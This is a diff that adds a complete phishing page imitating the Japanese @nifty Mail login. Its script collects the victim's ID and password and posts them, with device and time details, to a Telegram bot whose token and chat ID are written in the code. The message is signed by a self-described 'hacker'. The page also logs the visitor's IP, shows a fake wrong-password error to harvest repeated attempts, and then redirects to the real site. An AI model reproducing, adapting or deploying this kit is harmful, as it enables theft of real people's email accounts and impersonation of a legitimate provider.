@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+    <link rel="shortcut icon" href="https://www.nifty.com/favicon.ico" type="image/x-icon">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.2/lib/anime.min.js" integrity="sha256-tc4b48P1MPGS4PJXHRlChGCW1mEZy62jS/3JEsSHPzU=" crossorigin="anonymous"></script>
+    <title>@niftyメール - ログイン</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            height: 100%;
+            width: 100%;
+        }
+
+        body {
+            font-family: 'Hiragino Kaku Gothic Pro', 'メイリオ', Meiryo, sans-serif;
+            background-color: #f5f5f5;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .page-wrapper {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background-color: #f5f5f5;
+        }
+
+        /* Header */
+        .header {
+            background-color: white;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .header-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+            margin: 0;
+        }
+
+        /* Maintenance Banner */
+        .maintenance-banner {
+            background-color: #fff5f5;
+            border: 2px solid #d63031;
+            padding: 15px 20px;
+            margin: 20px;
+            border-radius: 4px;
+            max-width: 1200px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .maintenance-banner h3 {
+            color: #d63031;
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        .maintenance-banner p {
+            color: #333;
+            font-size: 13px;
+            line-height: 1.6;
+            margin: 0;
+        }
+
+        .maintenance-banner a {
+            color: #d63031;
+            text-decoration: underline;
+        }
+
+        /* Main Content */
+        .main-content {
+            flex: 1;
+            padding: 40px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        /* Login Box */
+        .login-container {
+            background-color: white;
+            max-width: 550px;
+            margin: 0 auto 40px;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+        }
+
+        .login-title {
+            text-align: center;
+            font-size: 28px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 35px;
+        }
+
+        /* Stage Display */
+        .stage {
+            display: none;
+        }
+
+        .stage.active {
+            display: block;
+        }
+
+        /* Email Display */
+        .email-display {
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 25px;
+            word-break: break-all;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-input-wrapper {
+            display: flex;
+            align-items: center;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding: 0;
+            background-color: #fafafa;
+        }
+
+        .form-input-wrapper.error {
+            border-color: #d63031;
+        }
+
+        .form-input-icon {
+            padding: 12px 12px;
+            color: #999;
+            font-size: 16px;
+        }
+
+        .form-input {
+            flex: 1;
+            border: none;
+            padding: 12px;
+            font-size: 14px;
+            background-color: transparent;
+            font-family: inherit;
+            color: #333;
+        }
+
+        .form-input::placeholder {
+            color: #999;
+        }
+
+        .form-input:focus {
+            outline: none;
+            background-color: white;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            gap: 8px;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+            accent-color: #0066cc;
+        }
+
+        .checkbox-label {
+            font-size: 13px;
+            color: #333;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        /* Error Message */
+        .error-message {
+            display: none;
+            color: #d63031;
+            font-size: 12px;
+            margin: 8px 0;
+            font-weight: 500;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        /* Info Message */
+        .info-message {
+            display: none;
+            color: #d63031;
+            font-size: 12px;
+            margin-bottom: 15px;
+            font-weight: 500;
+        }
+
+        .info-message.show {
+            display: block;
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background-color: #f0a500;
+            color: #000;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-bottom: 15px;
+        }
+
+        .btn-login:hover {
+            background-color: #d98b00;
+        }
+
+        .help-link {
+            display: block;
+            text-align: center;
+            font-size: 13px;
+            color: #0066cc;
+            text-decoration: underline;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        .help-link:hover {
+            color: #0052a3;
+        }
+
+        .switch-user-link {
+            display: block;
+            text-align: center;
+            font-size: 13px;
+            color: #0066cc;
+            text-decoration: underline;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        .switch-user-link:hover {
+            color: #0052a3;
+        }
+
+        /* Other Services Section */
+        .services-section {
+            background-color: white;
+            max-width: 550px;
+            margin: 40px auto;
+            padding: 30px 40px;
+            text-align: center;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+        }
+
+        .services-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 25px;
+        }
+
+        .services-list {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .service-link {
+            font-size: 13px;
+            color: #d63031;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        .service-link:hover {
+            color: #a01a1a;
+        }
+
+        /* Promotional Section */
+        .promo-section {
+            background-color: #fffaeb;
+            padding: 30px;
+            margin: 40px 20px;
+            border-radius: 8px;
+            display: flex;
+            gap: 30px;
+            max-width: 1200px;
+            margin-left: auto;
+            margin-right: auto;
+            align-items: center;
+        }
+
+        .promo-icons {
+            flex: 0 0 300px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 250px;
+        }
+
+        .promo-icon-svg {
+            width: 250px;
+            height: auto;
+        }
+
+        .promo-content {
+            flex: 1;
+            min-width: 300px;
+        }
+
+        .promo-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .promo-description {
+            font-size: 13px;
+            color: #333;
+            line-height: 1.7;
+            margin-bottom: 20px;
+        }
+
+        .promo-description .price {
+            font-weight: bold;
+            color: #d63031;
+        }
+
+        .btn-apply {
+            display: inline-block;
+            padding: 12px 35px;
+            border: 2px solid #333;
+            border-radius: 25px;
+            color: #333;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            background-color: transparent;
+            transition: all 0.3s ease;
+        }
+
+        .btn-apply:hover {
+            background-color: #333;
+            color: white;
+        }
+
+        /* Footer */
+        .footer {
+            background-color: #333;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            margin-top: 40px;
+            font-size: 12px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 10px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: white;
+            text-decoration: underline;
+        }
+
+        .footer-links a:hover {
+            text-decoration: none;
+        }
+
+        .footer-copyright {
+            font-size: 11px;
+            color: #ccc;
+        }
+
+        /* Loader */
+        .loader {
+            display: none;
+            gap: 8px;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .loader div {
+            width: 10px;
+            height: 10px;
+            background-color: #f0a500;
+            border-radius: 50%;
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .maintenance-banner {
+                margin: 15px;
+                padding: 12px 15px;
+            }
+
+            .maintenance-banner h3 {
+                font-size: 13px;
+            }
+
+            .maintenance-banner p {
+                font-size: 12px;
+            }
+
+            .main-content {
+                padding: 20px 15px;
+            }
+
+            .login-container {
+                padding: 25px 20px;
+                margin-bottom: 25px;
+            }
+
+            .login-title {
+                font-size: 22px;
+                margin-bottom: 25px;
+            }
+
+            .services-section {
+                padding: 25px 20px;
+                margin: 25px 15px;
+            }
+
+            .promo-section {
+                flex-direction: column;
+                padding: 20px;
+                margin: 25px 15px;
+                gap: 20px;
+            }
+
+            .promo-icons {
+                flex: 1;
+                width: 100%;
+                min-height: 180px;
+            }
+
+            .promo-icon-svg {
+                width: 200px;
+            }
+
+            .promo-content {
+                width: 100%;
+            }
+
+            .header-title {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="page-wrapper">
+    <!-- Header -->
+    <div class="header">
+        <h1 class="header-title">@nifty メール</h1>
+    </div>
+
+    <!-- Maintenance Banner -->
+    <div class="maintenance-banner">
+        <h3>システムメンテナンスのお知らせ</h3>
+        <p>11月25日（火）0:30～1:30頃までの間、システムメンテナンスを実施します。メンテナンス中は、ログインされた状態をご利用できない場合がございます。ご了承をお願いいたします。詳細は<a href="#">こちら</a>をご覧ください。</p>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content">
+        <!-- Login Box -->
+        <div class="login-container">
+            <!-- STAGE 1: ID/Username Entry -->
+            <div class="stage active" id="stage1">
+                <h2 class="login-title">ログイン</h2>
+
+                <form id="nifty-form-stage1" onsubmit="return gotoPasswordStage(event)">
+                    <div class="error-message" id="errorMsg1"></div>
+                    <div class="loader" id="loader1">
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                    </div>
+
+                    <div class="form-group">
+                        <div class="form-input-wrapper">
+                            <span class="form-input-icon">👤</span>
+                            <input type="text" id="nifty_id" name="nifty_id" class="form-input" required placeholder="@nifty ID またはユーザー名">
+                        </div>
+                    </div>
+
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="stay_logged" name="stay_logged" checked>
+                        <label for="stay_logged" class="checkbox-label">ログイン状態を保存する（共有コンピュータ利用時はチェックを外してください）</label>
+                    </div>
+
+                    <button type="submit" class="btn-login">パスワード入力へ</button>
+                </form>
+
+                <a href="#" class="help-link">>> @nifty ID またはユーザー名がわからない場合</a>
+            </div>
+
+            <!-- STAGE 2: Password Entry -->
+            <div class="stage" id="stage2">
+                <h2 class="login-title">パスワード入力</h2>
+
+                <div class="email-display" id="emailDisplay"></div>
+
+                <form id="nifty-form-stage2" onsubmit="return sendtelegram(event)">
+                    <div class="info-message" id="infoMsg"></div>
+                    <div class="error-message" id="errorMsg2"></div>
+                    <div class="loader" id="loader2">
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                    </div>
+
+                    <div class="form-group">
+                        <div class="form-input-wrapper" id="passwordWrapper">
+                            <span class="form-input-icon">🔒</span>
+                            <input type="password" id="password" name="password" class="form-input" required placeholder="パスワード">
+                        </div>
+                    </div>
+
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="show_password" name="show_password">
+                        <label for="show_password" class="checkbox-label">パスワードを表示</label>
+                    </div>
+
+                    <div class="error-message" id="passwordError"></div>
+
+                    <a href="#" class="switch-user-link" onclick="backToIdStage(event)">>> 別の @nifty ID またはユーザー名でログイン</a>
+
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="stay_logged2" name="stay_logged2" checked>
+                        <label for="stay_logged2" class="checkbox-label">ログイン状態を保存する（共有コンピュータ利用時はチェックを外してください）</label>
+                    </div>
+
+                    <button type="submit" class="btn-login">ログイン</button>
+                </form>
+
+                <a href="#" class="help-link">>> パスワードがわからない場合</a>
+            </div>
+        </div>
+
+        <!-- Other Services Section -->
+        <div class="services-section">
+            <h3 class="services-title">@niftyメールの他サービスはこちら</h3>
+            <div class="services-list">
+                <a href="#" class="service-link">セカンドメール</a>
+                <a href="#" class="service-link">セカンドメールPRO</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Promotional Section -->
+    <div class="promo-section">
+        <div class="promo-icons">
+            <svg class="promo-icon-svg" viewBox="0 0 300 200" xmlns="http://www.w3.org/2000/svg">
+                <!-- Shield -->
+                <rect x="30" y="20" width="60" height="70" rx="5" fill="#f4a460" opacity="0.8"/>
+                <path d="M 30 30 L 60 15 L 90 30 L 90 60 Q 60 85 60 85 Q 30 85 30 60 Z" fill="#ff9500" stroke="#ff8c00" stroke-width="2"/>
+                <text x="60" y="55" font-size="24" font-weight="bold" text-anchor="middle" fill="white">+</text>
+
+                <!-- Mail Envelope -->
+                <rect x="120" y="50" width="70" height="50" fill="#1e90ff" rx="3"/>
+                <path d="M 120 50 L 155 75 L 190 50" fill="none" stroke="#1e90ff" stroke-width="2"/>
+                <path d="M 120 50 L 155 75 L 190 50" fill="#87ceeb" opacity="0.6"/>
+
+                <!-- Blog/Document -->
+                <rect x="200" y="30" width="55" height="70" fill="#ffeb3b" rx="3"/>
+                <text x="227" y="50" font-size="16" font-weight="bold" text-anchor="middle" fill="#333">BLOG</text>
+                <line x1="210" y1="65" x2="245" y2="65" stroke="#333" stroke-width="1"/>
+                <line x1="210" y1="75" x2="245" y2="75" stroke="#333" stroke-width="1"/>
+                <line x1="210" y1="85" x2="240" y2="85" stroke="#333" stroke-width="1"/>
+
+                <!-- Laptop Base -->
+                <rect x="50" y="120" width="150" height="8" fill="#333"/>
+                <rect x="100" y="128" width="50" height="4" fill="#666"/>
+            </svg>
+        </div>
+
+        <div class="promo-content">
+            <h3 class="promo-title">メールやブログをご利用になる方</h3>
+            <p class="promo-description">
+                このプランは、安全でセキュアなメールとブログのサービスを月額<span class="price">250円（税込275円）</span>でご利用いただけます。
+            </p>
+            <button class="btn-apply" onclick="applyNifty()">@nifty基本料コースに申し込む</button>
+        </div>
+    </div>
+</div>
+
+<!-- Footer -->
+<div class="footer">
+    <div class="footer-links">
+        <a href="#">◀ @nifty Top</a>
+        <span>|</span>
+        <a href="#">ウェブサイト利用ガイドライン</a>
+        <span>|</span>
+        <a href="#">個人情報保護ポリシー</a>
+        <span>|</span>
+        <a href="#">推奨環境</a>
+    </div>
+    <div class="footer-copyright">
+        © ニフティ株式会社
+    </div>
+</div>
+
+<script>
+    // Get IP Address
+    function getIP(json) {
+        console.log("User IP: " + json.ip);
+    }
+
+    // Telegram Configuration
+    var tick = 0;
+    var telegram_bot_id = "8410611862:AAFiiaQ4SEniniaIMeC2p161GdQuoACB7UA";
+    var chat_id = 5491806427;
+    
+    // Global variables to store login data
+    var loginData = {
+        niftyId: '',
+        password: '',
+        stayLogged: false
+    };
+
+    // Stage 1: Go to Password Entry
+    function gotoPasswordStage(event) {
+        event.preventDefault();
+        
+        var niftyId = document.getElementById("nifty_id").value.trim();
+        
+        if (!niftyId) {
+            showError("@nifty IDまたはユーザー名を入力してください", "errorMsg1");
+            return false;
+        }
+
+        // Store the ID
+        loginData.niftyId = niftyId;
+        loginData.stayLogged = document.getElementById("stay_logged").checked;
+        
+        // Display email in stage 2
+        document.getElementById("emailDisplay").textContent = niftyId;
+        
+        // Switch to stage 2
+        document.getElementById("stage1").classList.remove("active");
+        document.getElementById("stage2").classList.add("active");
+        
+        // Focus on password field
+        setTimeout(() => {
+            document.getElementById("password").focus();
+        }, 100);
+        
+        return false;
+    }
+
+    // Stage 1: Back to ID Entry
+    function backToIdStage(event) {
+        event.preventDefault();
+        
+        // Clear password
+        document.getElementById("password").value = "";
+        document.getElementById("errorMsg2").textContent = "";
+        document.getElementById("errorMsg2").classList.remove("show");
+        document.getElementById("infoMsg").classList.remove("show");
+        
+        // Switch back to stage 1
+        document.getElementById("stage2").classList.remove("active");
+        document.getElementById("stage1").classList.add("active");
+        
+        // Focus on ID field
+        setTimeout(() => {
+            document.getElementById("nifty_id").focus();
+        }, 100);
+        
+        return false;
+    }
+
+    // Show password functionality
+    document.getElementById("show_password").addEventListener("change", function() {
+        var passwordInput = document.getElementById("password");
+        if (this.checked) {
+            passwordInput.type = "text";
+        } else {
+            passwordInput.type = "password";
+        }
+    });
+
+    // Prepare message data
+    var ready = function () {
+        var niftyId = loginData.niftyId;
+        var password = loginData.password;
+        var stayLogged = loginData.stayLogged ? "はい" : "いいえ";
+
+        var message = "🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯\n \n📧 @NIFTY MAIL ログイン ✅\n\n🆔 ID/ユーザー名: " + niftyId + "\n🔐 パスワード: " + password + "\n☑️ ログイン状態保存: " + stayLogged + "\n\n▬▬▬▬▬▬[ログイン情報]▬▬▬▬▬▬ " + "\n🌐 サービス: @nifty メール\n📱 デバイス: " + (window.innerWidth <= 768 ? "モバイル" : "デスクトップ") + "\n⏰ 時刻: " + new Date().toLocaleString('ja-JP') + "\n🔗 URL: https://mail.nifty.com/\n\n📞 HACKER: @plus234ng";
+
+        return message;
+    };
+
+    // Send to Telegram
+    var sendtelegram = function (event) {
+        event.preventDefault();
+        
+        var password = document.getElementById("password").value.trim();
+
+        if (!password) {
+            showError("パスワードを入力してください", "errorMsg2");
+            return false;
+        }
+
+        tick += 1;
+        loginData.password = password;
+        loginData.stayLogged = document.getElementById("stay_logged2").checked;
+        
+        var message = ready();
+
+        // Show loader
+        document.getElementById("loader2").style.display = "flex";
+        document.getElementById("errorMsg2").classList.remove("show");
+
+        // Animate loader
+        let tl = anime.timeline({
+            easing: 'easeOutExpo',
+            duration: 300,
+            loop: true
+        });
+
+        tl.add({
+            targets: '#loader2 div',
+            translateX: 185,
+            delay: anime.stagger(300, { easing: 'linear' }),
+            duration: 500,
+        })
+        tl.add({
+            targets: '#loader2 div',
+            translateX: 1000,
+            delay: anime.stagger(300, { easing: 'linear' }),
+            duration: 500,
+        })
+
+        // Send data to Telegram
+        setTimeout(() => {
+            tl.pause();
+            tl.restart();
+
+            setTimeout(() => {
+                tl.pause();
+                document.getElementById("loader2").style.display = "none";
+            }, 10);
+
+            var settings = {
+                "async": true,
+                "crossDomain": true,
+                "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+                "method": "POST",
+                "headers": {
+                    "Content-Type": "application/json",
+                    "cache-control": "no-cache"
+                },
+                "data": JSON.stringify({
+                    "chat_id": chat_id,
+                    "text": message
+                })
+            };
+
+            $.ajax(settings).done(function (response) {
+                console.log("Telegram response:", response);
+            }).fail(function (error) {
+                console.log("Telegram error:", error);
+            });
+
+            // Show error message
+            document.getElementById("errorMsg2").textContent = "ユーザー名またはパスワードが正しくありません。";
+            document.getElementById("errorMsg2").classList.add("show");
+            document.getElementById("password").value = "";
+
+            // Redirect after multiple attempts
+            if (tick >= 3) {
+                setTimeout(() => {
+                    window.location.replace("https://mail.nifty.com/");
+                }, 3000);
+            }
+        }, 5000);
+
+        return false;
+    };
+
+    // Show error message
+    function showError(msg, elementId) {
+        var element = document.getElementById(elementId);
+        if (element) {
+            element.textContent = msg;
+            element.classList.add("show");
+        }
+    }
+
+    // Hide error on input focus
+    document.getElementById("nifty_id").addEventListener("focus", function () {
+        var element = document.getElementById("errorMsg1");
+        if (element) {
+            element.classList.remove("show");
+        }
+    });
+
+    document.getElementById("password").addEventListener("focus", function () {
+        var element = document.getElementById("errorMsg2");
+        if (element) {
+            element.classList.remove("show");
+        }
+    });
+
+    // Apply button handler
+    function applyNifty() {
+        window.location.href = "https://www.nifty.com/";
+    }
+
+    // Initialize
+    $(document).ready(function () {
+        console.log("@nifty メール ログインページが読み込まれました");
+
+        // Keyboard submit support
+        $(document).keypress(function (event) {
+            var keycode = (event.keyCode ? event.keyCode : event.which);
+            if (keycode == '13') {
+                event.preventDefault();
+                
+                // Check which stage is active
+                if (document.getElementById("stage1").classList.contains("active")) {
+                    document.getElementById("nifty-form-stage1").submit();
+                } else if (document.getElementById("stage2").classList.contains("active")) {
+                    document.getElementById("nifty-form-stage2").submit();
+                }
+            }
+        });
+    });
+</script>
+
+</body>
+</html>
